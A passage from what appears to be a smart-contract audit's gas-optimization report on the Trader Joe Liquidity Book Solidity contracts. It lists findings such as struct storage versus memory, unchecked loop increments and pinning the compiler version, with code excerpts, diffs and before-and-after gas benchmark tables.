https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L68-L70  ### [G&#x2011;02]  State variables can be packed into fewer storage slots If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper  *There is 1 instance of this issue:* ```solidity File: src/LBFactory.sol  /// @audit Variable ordering with 8 slots instead of the current 9: ///           move bool(1):creationUnlocked to be right after address(20):feeRecipient 32:       address public override LBPairImplementation;  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L32  ### [G&#x2011;03]  Using `storage` instead of `memory` for structs/arrays saves gas When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct  *There are 11 instances of this issue:* ```solidity File: src/LBFactory.sol  197:                          LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][i];  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L197  ```solidity File: src/LBPair.sol  220:              FeeHelper.FeeParameters memory _fp = _feeParameters;  283:                      Bin memory _bin = _bins[_id];  310:          PairInformation memory _pair = _pairInformation;  318:          FeeHelper.FeeParameters memory _fp = _feeParameters;  327:              Bin memory _bin = _bins[_pair.activeId];  426:          FeeHelper.FeeParameters memory _fp = _feeParameters;  484:          PairInformation memory _pair = _pairInformation;  486:          FeeHelper.FeeParameters memory _fp = _feeParameters;  498:                  Bin memory _bin = _bins[_mintInfo.id];  706:                      Bin memory _bin = _bins[_id];  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L220   ### [G&#x2011;04]  Avoid contract existence checks by using low level calls Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence  *There are 28 instances of this issue:* ```solidity File: src/LBFactory.sol  /// @audit factory() 216:          if (ILBPair(_LBPairImplementation).factory() != this)  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L216  ```solidity File: src/LBQuoter.sol  /// @audit getPair() 77:               quote.pairs[i] = IJoeFactory(factoryV1).getPair(_route[i], _route[i + 1]);  /// @audit getAllLBPairs() 94:               ILBFactory.LBPairInformation[] memory LBPairsAvailable = ILBFactory(factoryV2).getAllLBPairs(  /// @audit getSwapOut() 105:                              ILBRouter(routerV2).getSwapOut(LBPairsAvailable[j].LBPair, quote.amounts[i], swapForY)  /// @audit getPair() 156:              quote.pairs[i - 1] = IJoeFactory(factoryV1).getPair(_route[i - 1], _route[i]);  /// @audit getAllLBPairs() 171:              ILBFactory.LBPairInformation[] memory LBPairsAvailable = ILBFactory(factoryV2).getAllLBPairs(  /// @audit getSwapIn() 181:                              ILBRouter(routerV2).getSwapIn(LBPairsAvailable[j].LBPair, quote.amounts[i], swapForY)  /// @audit getReserves() 223:          (uint256 reserve0, uint256 reserve1, ) = IJoePair(_pair).getReserves();  /// @audit mulShiftRoundDown() 240:              quote = BinHelper.getPriceFromId(_activeId, _binStep).mulShiftRoundDown(_amount, Constants.SCALE_OFFSET);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L77  ```solidity File: src/LBRouter.sol  /// @audit getReserves() 718:                  (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();  /// @audit tokenX() 727:                  (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token);  /// @audit getReserves() 788:                      (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();  /// @audit swap() 792:                          IJoePair(_pair).swap(0, amountOut, _recipient, "");  /// @audit swap() 795:                          IJoePair(_pair).swap(amountOut, 0, _recipient, "");  /// @audit tokenY() 798:                      bool _swapForY = _tokenNext == ILBPair(_pair).tokenY();  /// @audit swap() 800:                      (uint256 _amountXOut, uint256 _amountYOut) = ILBPair(_pair).swap(_swapForY, _recipient);  /// @audit swap() 843:                          IJoePair(_pair).swap(0, amountOut, _recipient, "");  /// @audit swap() 845:                          IJoePair(_pair).swap(amountOut, 0, _recipient, "");  /// @audit tokenY() 848:                      bool _swapForY = _tokenNext == ILBPair(_pair).tokenY();  /// @audit swap() 850:                      (uint256 _amountXOut, uint256 _amountYOut) = ILBPair(_pair).swap(_swapForY, _recipient);  /// @audit getReserves() 888:                      (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();  /// @audit swap() 893:                          IJoePair(_pair).swap(0, _amountOut, _recipient, "");  /// @audit swap() 898:                          IJoePair(_pair).swap(_amountOut, 0, _recipient, "");  /// @audit swap() /// @audit tokenY() 901:                      ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L718  ```solidity File: src/libraries/BinHelper.sol  /// @audit power() 44:               return _getBPValue(_binStep).power(_realId);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/BinHelper.sol#L44  ```solidity File: src/libraries/TokenHelper.sol  /// @audit call() 28:               (bool success, bytes memory result) = address(token).call(  /// @audit call() 46:               (bool success, bytes memory result) = address(token).call(  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/TokenHelper.sol#L28  ```diff diff --git a/src/LBFactory.sol b/src/LBFactory.sol index 32ee39c..df9d1c7 100644 --- a/src/LBFactory.sol +++ b/src/LBFactory.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/proxy/Clones.sol";  import "openzeppelin/utils/structs/EnumerableSet.sol"; diff --git a/src/LBQuoter.sol b/src/LBQuoter.sol index 53fdf0c..e9f9815 100644 --- a/src/LBQuoter.sol +++ b/src/LBQuoter.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "./LBErrors.sol";  import "./libraries/BinHelper.sol"; diff --git a/src/LBRouter.sol b/src/LBRouter.sol index 567c49a..532cc13 100644 --- a/src/LBRouter.sol +++ b/src/LBRouter.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/IERC20.sol";   diff --git a/src/libraries/BinHelper.sol b/src/libraries/BinHelper.sol index db0fef8..c6cf99c 100644 --- a/src/libraries/BinHelper.sol +++ b/src/libraries/BinHelper.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "../LBErrors.sol";  import "./Math128x128.sol"; diff --git a/src/libraries/TokenHelper.sol b/src/libraries/TokenHelper.sol index 17d8e23..3391a98 100644 --- a/src/libraries/TokenHelper.sol +++ b/src/libraries/TokenHelper.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/IERC20.sol";   diff --git a/test/LBPair.t.sol b/test/LBPair.t.sol index d84bb5b..550d55a 100644 --- a/test/LBPair.t.sol +++ b/test/LBPair.t.sol @@ -1,5 +1,5 @@  // SPDX-License-Identifier: UNLICENSED -pragma solidity 0.8.7; +pragma solidity 0.8.10;    import "./TestHelper.sol";   diff --git a/test/mocks/ERC20.sol b/test/mocks/ERC20.sol index 0543ab8..4cabd37 100644 --- a/test/mocks/ERC20.sol +++ b/test/mocks/ERC20.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/ERC20.sol";   diff --git a/test/mocks/ERC20MockDecimals.sol b/test/mocks/ERC20MockDecimals.sol index b952b88..95d1797 100644 --- a/test/mocks/ERC20MockDecimals.sol +++ b/test/mocks/ERC20MockDecimals.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/ERC20.sol";   diff --git a/test/mocks/ERC20MockDecimalsOwnable.sol b/test/mocks/ERC20MockDecimalsOwnable.sol index 081940f..7ca3b95 100644 --- a/test/mocks/ERC20MockDecimalsOwnable.sol +++ b/test/mocks/ERC20MockDecimalsOwnable.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/ERC20.sol";  import "openzeppelin/access/Ownable.sol"; diff --git a/test/mocks/ERC20WithTransferTax.sol b/test/mocks/ERC20WithTransferTax.sol index 7a7a1f4..269616d 100644 --- a/test/mocks/ERC20WithTransferTax.sol +++ b/test/mocks/ERC20WithTransferTax.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/ERC20.sol";   diff --git a/test/mocks/Faucet.sol b/test/mocks/Faucet.sol index 108bde7..e00e8fd 100644 --- a/test/mocks/Faucet.sol +++ b/test/mocks/Faucet.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "../../src/libraries/PendingOwnable.sol";  import "../../src/libraries/TokenHelper.sol"; diff --git a/test/mocks/FlashloanBorrower.sol b/test/mocks/FlashloanBorrower.sol index 16817a8..2bfe335 100644 --- a/test/mocks/FlashloanBorrower.sol +++ b/test/mocks/FlashloanBorrower.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/interfaces/IERC20.sol";   diff --git a/test/mocks/WAVAX.sol b/test/mocks/WAVAX.sol index fd86df0..0ff59a0 100644 --- a/test/mocks/WAVAX.sol +++ b/test/mocks/WAVAX.sol @@ -1,6 +1,6 @@  // SPDX-License-Identifier: MIT   -pragma solidity ^0.8.0; +pragma solidity 0.8.10;    import "openzeppelin/token/ERC20/ERC20.sol";   ```  ```diff diff --git a/tmp/gas_before b/tmp/gas_after index f6d4cb0..3e4d40b 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -5,3 +5,3 @@   - 2086657                               10631                                             + 2083650                               10616                                               @@ -59,3 +59,3 @@   - setLBPairImplementation               1524             24536   25108   25108   147      + setLBPairImplementation               1396             24408   24980   24980   147        @@ -68,3 +68,3 @@   - 4835641                         24410                                                 + 4823808                         24344                                                   @@ -74,9 +74,9 @@   - balanceOfBatch                  3766             7101     5769     11769     3        + balanceOfBatch                  3513             6936     5648     11648     3          - burn                            11235            111199   107074   244666    14       + burn                            11185            111009   106900   244223    14         - collectFees                     6720             27696    20481    44969     7        + collectFees                     6659             27637    20420    44908     7          - collectProtocolFees             5620             8817     9349     10952     4        + collectProtocolFees             5517             8708     9247     10824     4          @@ -88,3 +88,3 @@   - flashLoan                       24674            55799    24674    118050    3        + flashLoan                       24546            55415    24546    117154    3          @@ -108,3 +108,3 @@   - mint                            6892             1402686  1389693  14398451  216      + mint                            6889             1401974  1389110  14394628  216        @@ -112,5 +112,5 @@   - pendingFees                     4041             12049    12853    22185     8        + pendingFees                     3980             11987    12792    22076     8          - safeBatchTransferFrom           3251             408394   319740   1394600   25       + safeBatchTransferFrom           2997             408204   319642   1394156   25         @@ -122,3 +122,3 @@   - swap                            22475            50419    30217    341090    318      + swap                            22347            50291    30089    340962    318        @@ -141,3 +141,3 @@   - 1899867                             9873                                            + 1862779                             9669                                              @@ -149,5 +149,5 @@   - findBestPathFromAmountIn            1033             45266  45438   88927  5        + findBestPathFromAmountIn            1021             44110  44256   86575  5          - findBestPathFromAmountOut           1011             38128  40133   68750  5        + findBestPathFromAmountOut           999              37100  39335   66782  5          @@ -160,3 +160,3 @@   - 4591267                                                23440                                                + 4464246                                                22787                                                  @@ -164,7 +164,7 @@   - addLiquidity                                           19672            1271036  1387744  3343198  132      + addLiquidity                                           19104            1269581  1386214  3340492  132        - addLiquidityAVAX                                       20036            1466238  1443921  3391536  41       + addLiquidityAVAX                                       19453            1464700  1442391  3388830  41         - createLBPair                                           279323           311452   317427   331632   4        + createLBPair                                           279195           311324   317299   331504   4          @@ -174,9 +174,9 @@   - getIdFromPrice                                         19069            28334    32951    32983    3        + getIdFromPrice                                         18941            28206    32823    32855    3          - getPriceFromId                                         4771             5491     5834     5868     3        + getPriceFromId                                         4643             5363     5706     5740     3          - getSwapIn                                              1980             18959    11151    61718    30       + getSwapIn                                              1852             18336    10767    59542    30         - getSwapOut                                             12368            19836    21752    28264    20       + getSwapOut                                             11984            19375    21112    27368    20         @@ -184,27 +184,27 @@   - removeLiquidity                                        2118             579712   408504   1623758  10       + removeLiquidity                                        2068             578983   407904   1622121  10         - removeLiquidityAVAX                                    1941             976395   1115696  1672247  4        + removeLiquidityAVAX                                    1891             975385   1114521  1670610  4          - swapAVAXForExactTokens                                 1534             28653    8550     166467   8        + swapAVAXForExactTokens                                 1520             28333    8348     165405   8          - swapExactAVAXForTokens                                 1578             51884    15354    153614   8        + swapExactAVAXForTokens                                 1564             51591    15036    153064   8          - swapExactAVAXForTokensSupportingFeeOnTransferTokens    1556             51177    14867    163525   9        + swapExactAVAXForTokensSupportingFeeOnTransferTokens    1542             50810    14549    162719   9          - swapExactTokensForAVAX                                 1630             69984    15522    286316   10       + swapExactTokensForAVAX                                 1616             69659    15204    285230   10         - swapExactTokensForAVAXSupportingFeeOnTransferTokens    1610             56192    15502    167467   10       + swapExactTokensForAVAXSupportingFeeOnTransferTokens    1596             55786    15184    166822   10         - swapExactTokensForTokens                               1631             105125   67133    538137   13       + swapExactTokensForTokens                               1617             104587   66693    535979   13         - swapExactTokensForTokensSupportingFeeOnTransferTokens  1610             55076    45689    136771   10       + swapExactTokensForTokensSupportingFeeOnTransferTokens  1596             54621    45207    135965   10         - swapTokensForExactAVAX                                 1588             29596    8610     173651   8        + swapTokensForExactAVAX                                 1574             29302    8408     172801   8          - swapTokensForExactTokens                               1632             127782   24140    609504   11       + swapTokensForExactTokens                               1618             126636   23462    605298   11         - sweep                                                  6028             26141    26740    36036    5        + sweep                                                  5900             26003    26535    35908    5          - sweepLBToken                                           3264             156904   156904   310544   2        + sweepLBToken                                           3014             156630   156630   310247   2          @@ -217,3 +217,3 @@   - 19179229                                                       95589                                       + 18854334                                                       93969                                         @@ -228,3 +228,3 @@   - 17699454                                                       88210                                       + 17397071                                                       86702                                         @@ -249,3 +249,3 @@   - transfer                                                     2581             10121  3226    29926  527      + transfer                                                     2581             10093  3226    29926  526        @@ -258,3 +258,3 @@   - 693730                                                                     4198                                            + 693718                                                                     4161                                              @@ -292,3 +292,3 @@   - 1098332                                5556                                             + 1095325                                5541                                               @@ -306,5 +306,5 @@   - request()                              340              73455  101517  137977  12       + request()                              340              73284  101261  137721  12         - request(address)                       622              64004  58354   138687  4        + request(address)                       622              63876  58226   138431  4          @@ -327,3 +327,3 @@   - 413779                                                   2134                                             + 401767                                                   2074                                               @@ -331,7 +331,7 @@   - LBFlashLoanCallback                                      12455            12455  12455   12455   1        + LBFlashLoanCallback                                      11943            11943  11943   11943   1          - flashBorrow                                              33471            77648  77648   121826  2        + flashBorrow                                              33343            77136  77136   120930  2          - flashBorrowWithReentrancy                                33427            33427  33427   33427   1        + flashBorrowWithReentrancy                                33299            33299  33299   33299   1          ```  ``` testInversePriceForOppositeBins() (gas: 0 (0.000%))  testRevertOnNonEOA() (gas: 0 (0.000%))  testForInvalidReductionFactor() (gas: 0 (0.000%))  testSetFeeRecipientNotByOwnerReverts() (gas: 0 (0.000%))  testsetFactoryLockedState() (gas: 0 (0.000%))  testSelfApprovalReverts() (gas: 0 (0.000%))  testInternalApproval() (gas: 0 (0.000%))  testInternalBurn(uint256,uint256) (gas: 0 (0.000%))  testInternalBurnFrom0AddressReverts() (gas: 0 (0.000%))  testInternalExcessiveBurnAmountReverts(uint128,uint128) (gas: 0 (0.000%))  testInternalMint(uint256) (gas: 0 (0.000%))  testInternalMintTo0AddressReverts() (gas: 0 (0.000%))  testAddToken() (gas: -19 (-0.002%))  testForInvalidFeeRecipient() (gas: -7 (-0.010%))  testIncreaseOracleLength() (gas: -256 (-0.012%))  testSetFeesParametersOnPairReverts() (gas: -128 (-0.036%))  testForDoubleIgnored() (gas: -128 (-0.036%))  testForInvalidBaseFactor() (gas: -128 (-0.036%))  testForInvalidFilterPeriod() (gas: -128 (-0.036%))  testCreatePairWhenFactoryIsUnlocked() (gas: -262 (-0.070%))  testSetFeesParametersOnPair() (gas: -256 (-0.071%))  testTLowerThanTimestamp() (gas: -5524 (-0.072%))  testIfPairAlreadyExistsReverts() (gas: -256 (-0.073%))  testGetSwapOutWithMultipleChoices() (gas: -3684 (-0.090%))  testForceDecay() (gas: -8084 (-0.101%))  testFuzzingAddLiquidity(uint256) (gas: -1066 (-0.103%))  testForInvalidProtocolShare() (gas: -384 (-0.109%))  testSwapXtoYDistantBinsFromGetSwapOut() (gas: -1970 (-0.112%))  testFlashloan() (gas: -1953 (-0.113%))  testInsufficientLiquidityMinted() (gas: -1876 (-0.114%))  testSwapXtoYConsecutiveBinFromGetSwapOut() (gas: -1970 (-0.115%))  testSwapYtoXConsecutiveBinFromGetSwapOut() (gas: -1970 (-0.116%))  testBurnLiquidity() (gas: -2272 (-0.120%))  testSwapXtoYDistantBinsFromGetSwapIn() (gas: -2098 (-0.120%))  testSwapXtoYConsecutiveBinFromGetSwapIn() (gas: -2098 (-0.123%))  testSwapYtoXConsecutiveBinFromGetSwapIn() (gas: -2098 (-0.123%))  testSwapYtoXDistantBinsFromGetSwapOut() (gas: -2226 (-0.125%))  testOracleSampleFromWith100SamplesNotAllInitialized() (gas: -24340 (-0.125%))  testSwapYtoXDistantBinsFromGetSwapIn() (gas: -2354 (-0.132%))  testTaxTokenSwappedOnV1Pairs() (gas: -6516 (-0.134%))  testFailFlashloanMoreThanReserves() (gas: -128 (-0.141%))  testFailFlashlaonWithReentrancy() (gas: -128 (-0.142%))  testFlawedCompositionFactor() (gas: -2724 (-0.162%))  testLockRequest() (gas: -256 (-0.162%))  testSafeBatchTransferFrom() (gas: -2642 (-0.167%))  testSafeTransferNotApprovedReverts() (gas: -1906 (-0.182%))  testEnsureModifierLiquidity() (gas: -1549 (-0.183%))  testAddLiquidityTaxToken() (gas: -6640 (-0.185%))  testForAmountSlippageCaughtReverts() (gas: -4296 (-0.193%))  testSafeBatchTransferNotApprovedReverts() (gas: -2028 (-0.193%))  testGetIdFromPrice() (gas: -896 (-0.195%))  testSafeTransferFromReverts() (gas: -3730 (-0.196%))  testOracleSampleFromEdgeCases() (gas: -948 (-0.198%))  testDistributionOverflowReverts() (gas: -1768 (-0.204%))  testGetSwapInMoreBins() (gas: -4018 (-0.204%))  testGetSwapInWithMultipleChoices() (gas: -3684 (-0.205%))  testForIdSlippageCaughtReverts() (gas: -4570 (-0.205%))  testOracleSampleFromWith2Samples() (gas: -1076 (-0.207%))  testSwapWithDifferentBinSteps() (gas: -4380 (-0.209%))  testGetSwapInOverflowReverts() (gas: -1586 (-0.213%))  testRemoveLiquiditySlippageReverts() (gas: -13559 (-0.215%))  testModifierCheckLength() (gas: -4108 (-0.216%))  testGetSwapOutOnV2Pair() (gas: -3556 (-0.224%))  testGetSwapInOnV2Pair() (gas: -3556 (-0.224%))  testClaimFeesY() (gas: -2792 (-0.228%))  testClaimFeesX() (gas: -2792 (-0.228%))  testGetPriceFromId() (gas: -896 (-0.230%))  testAddLiquidityIgnored() (gas: -4256 (-0.231%))  testSetLBPairImplementation() (gas: -39185 (-0.234%))  testFeesOnTokenTransfer() (gas: -3298 (-0.236%))  testBalanceOfBatch() (gas: -2522 (-0.237%))  testAddLiquidityAVAXReversed() (gas: -11019 (-0.241%))  testAddLiquidityAVAX() (gas: -11922 (-0.241%))  testQuoteAssets() (gas: -1792 (-0.242%))  testConstructor(uint16,uint16,uint16,uint16,uint16,uint24,uint16,uint24) (gas: -12363 (-0.243%))  testGetSwapInOnComplexRoute() (gas: -4542 (-0.244%))  testSweepLBToken() (gas: -4475 (-0.248%))  testSafeBatchTransferFromReverts() (gas: -5060 (-0.249%))  testCreateLBPair() (gas: -896 (-0.251%))  testCreateLBPair() (gas: -1024 (-0.252%))  testSafeTransferFrom() (gas: -3058 (-0.261%))  testGetSwapOutOnComplexRoute() (gas: -4926 (-0.262%))  testAddLiquidityNoSlippage() (gas: -5707 (-0.273%))  testRemoveLiquidityReverseOrder() (gas: -5708 (-0.273%))  testOracleSampleFromWith100Samples() (gas: -69140 (-0.276%))  testSetRequestAmount() (gas: -512 (-0.280%))  testWithdrawAvax() (gas: -512 (-0.294%))  testClaimProtocolFees() (gas: -3828 (-0.307%))  testClaimFeesComplex(uint256,uint256) (gas: -4212 (-0.322%))  testGetSwapInWrongAmountsReverts() (gas: -6608 (-0.330%))  testRequestFaucetTokensByOperator() (gas: -1024 (-0.332%))  testSwapYtoXSingleBinFromGetSwapOut() (gas: -1714 (-0.344%))  testSwapXtoYSingleBinFromGetSwapOut() (gas: -1714 (-0.344%))  testSwapXtoYSingleBinFromGetSwapIn() (gas: -1714 (-0.345%))  testForLengthsMismatchReverts() (gas: -762 (-0.367%))  testFeeOnActiveBinReverse() (gas: -3274 (-0.372%))  testFeeOnActiveBin() (gas: -3274 (-0.372%))  testRequestFaucetTokens() (gas: -1024 (-0.381%))  testSwapYtoXSingleBinFromGetSwapIn() (gas: -1970 (-0.386%))  testGetSwapInOnV1Pair() (gas: -1168 (-0.405%))  testSwapExactTokensForAvaxSinglePair() (gas: -1597 (-0.415%))  testSwapExactTokensForTokensMultiplePairs() (gas: -2542 (-0.424%))  testForZeroAddressPairReverts() (gas: -256 (-0.434%))  testSweep() (gas: -512 (-0.456%))  testInvalidBinStepWhileCreatingLBPair() (gas: -128 (-0.463%))  testAddLiquidityAVAXnotAVAXReverts() (gas: -965 (-0.465%))  testGetSwapOutOnV1Pair() (gas: -1552 (-0.505%))  testWithdrawToken() (gas: -1024 (-0.524%))  testTaxTokenEqualOnlyV2Swap() (gas: -3196 (-0.525%))  testSwapExactTokensForAVAXSupportingFeeOnTransferTokens() (gas: -2007 (-0.534%))  testSetFeeRecipient() (gas: -128 (-0.539%))  testSwapExactAVAXForTokensSinglePair() (gas: -1996 (-0.544%))  testForIdDesiredOverflowReverts() (gas: -1906 (-0.556%))  testSweepMax() (gas: -640 (-0.565%))  testAvailableBinSteps() (gas: -730 (-0.585%))  testForIdenticalAddressesReverts() (gas: -128 (-0.622%))  testAddRemovePresets() (gas: -504 (-0.627%))  testSwapExactAVAXForTokensSupportingFeeOnTransferTokens() (gas: -2508 (-0.649%))  testForSettingFlashloanFee() (gas: -128 (-0.654%))  testSwapExactTokensForTokensSinglePair() (gas: -2124 (-0.672%))  testFactoryLockedReverts() (gas: -128 (-0.684%))  testWrongTokenOrderReverts() (gas: -1674 (-0.723%))  testInsufficientLiquidityBurnedReverts() (gas: -178 (-0.741%))  testSwapExactTokensForTokensMultiplePairsWithV1() (gas: -2812 (-0.749%))  testSwapTokensForExactTokensMultiplePairsWithV1() (gas: -4418 (-0.763%))  testModifieronlyFactoryOwner() (gas: -128 (-0.770%))  testFeesAboveMaxVolatilityReverts(uint8) (gas: -128 (-0.833%))  testFeesAboveMaxBaseFactorReverts(uint8) (gas: -128 (-0.837%))  testSwapInsufficientAmountReverts() (gas: -512 (-0.859%))  testSwapExactTokensForTokensSupportingFeeOnTransferTokens() (gas: -4423 (-0.862%))  testRemoveToken() (gas: -384 (-0.873%))  testPendingFeesNotIncreasingReverts() (gas: -153 (-0.877%))  testSetRequestCooldown() (gas: -1792 (-0.890%))  testSwapTokensForExactTokensMultiplePairs() (gas: -7446 (-0.926%))  testSwapTokensForExactAVAXSinglePair() (gas: -2658 (-0.945%))  testSwapAVAXForExactTokensSinglePair() (gas: -2658 (-1.066%))  testSetPresets() (gas: -384 (-1.104%))  testVerifyOracleInitialParams() (gas: -128 (-1.124%))  testCollectingFeesOnlyFeeRecipient() (gas: -256 (-1.127%))  testMintWrongLengthsReverts() (gas: -516 (-1.156%))  testSwapTokensForExactTokensSinglePair() (gas: -2786 (-1.174%))  testInvalidLength() (gas: -292 (-1.644%))  testSwappingOnNotExistingV1PairReverts() (gas: -4011 (-1.933%))  testSwappingOnNotExistingV2PairReverts() (gas: -4011 (-2.034%))  testPrivateViewFunctions() (gas: -256 (-2.037%))  testgetAllLBPairs() (gas: -128415 (-2.258%)) <------------------------------------ testConstructor() (gas: -256 (-2.340%))  testInvalidTokenPathReverts() (gas: -828 (-2.380%))  testForInvalidBinStepUnderflowReverts() (gas: -384 (-2.531%))  testForInvalidBinStepOverflowReverts() (gas: -384 (-2.539%))  testModifierEnsure() (gas: -1955 (-3.207%))  testConstructor() (gas: -384 (-3.242%))  testConstructor() (gas: -384 (-3.858%))  testModifierVerifyInputs() (gas: -3198 (-4.074%))  Overall gas change: -581485 (-81.334%) <------------------------------------ ```   ### [G&#x2011;05]  Multiple accesses of a mapping/array should use a local variable cache The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata  *There is 1 instance of this issue:* ```solidity File: src/LBPair.sol  /// @audit _bins[_id] on line 452 453:          _bins[_id].accTokenYPerShare += _feesY.getTokenPerShare(_totalSupply);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L453  ### [G&#x2011;06]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement `require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`  *There are 5 instances of this issue:* ```solidity File: src/LBPair.sol  /// @audit if-condition on line 219 225:                  uint256 _deltaT = _lookUpTimestamp - timestamp;  /// @audit if-condition on line 534 536:                                  _fp.getFeeAmountForC(_mintInfo.amountX - _receivedX)  /// @audit if-condition on line 545 547:                                  _fp.getFeeAmountForC(_mintInfo.amountY - _receivedY)  /// @audit if-condition on line 597 598:                  tokenX.safeTransfer(_to, _mintInfo.amountXIn - _amountAddedPlusFee);  /// @audit if-condition on line 602 603:                  tokenY.safeTransfer(_to, _mintInfo.amountYIn - _amountAddedPlusFee);  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L225  ### [G&#x2011;07]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**  *There are 5 instances of this issue:* ```solidity File: src/LBQuoter.sol  75:           for (uint256 i; i < swapLength; i++) {  100:                  for (uint256 j; j < LBPairsAvailable.length; j++) {  154:          for (uint256 i = swapLength; i > 0; i--) {  177:                  for (uint256 j; j < LBPairsAvailable.length; j++) {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBQuoter.sol#L75  ```solidity File: src/LBRouter.sol  711:          for (uint256 i = _pairs.length; i != 0; i--) {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L711  ### [G&#x2011;08]  Optimize names to save gas `public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)  *There are 11 instances of this issue:* ```solidity File: src/interfaces/IJoeFactory.sol  /// @audit feeTo(), feeToSetter(), migrator(), getPair(), allPairs(), allPairsLength(), createPair(), setFeeTo(), setFeeToSetter(), setMigrator() 7:    interface IJoeFactory {  ``` https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/interfaces/IJoeFactory.sol#L7  ```solidity File: 